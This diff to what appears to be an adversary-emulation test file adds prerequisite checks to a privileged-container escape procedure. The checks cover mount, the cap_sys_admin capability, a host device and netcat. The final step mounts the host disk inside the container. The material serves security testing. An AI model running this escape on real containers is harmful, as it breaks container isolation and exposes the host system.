@@ -30,6 +30,26 @@ requirements:
     platforms:
         - os: containers
 steps:
+    - name: Verify mount is installed.
+      inline: |
+        which mount
+      executor: sh
+    - name: Verify container is privileged.
+      inline: |
+        capsh --print | grep cap_sys_admin
+      executor: sh
+    - name: Verify mount device (/dev/dm-0) exists.
+      inline: |
+        ls #{mount_device}
+      executor: sh
+    - name: Netcat is installed.
+      inline: |
+        which netcat
+      executor: sh
+    - name: IP Address is known.
+      inline: |
+        if [ "#{listen_address}" != "" ]; then echo "Listen address set as #{listen_address}" ; fi
+      executor: sh
     - name: mount-host-filesystem-to-escape-privileged-docker-container
       inline: |
         if [ ! -d {{.Args.mount_point}} ]; then mkdir {{.Args.mount_point}} ; mount {{.Args.mount_device}} {{.Args.mount_point}}; fi
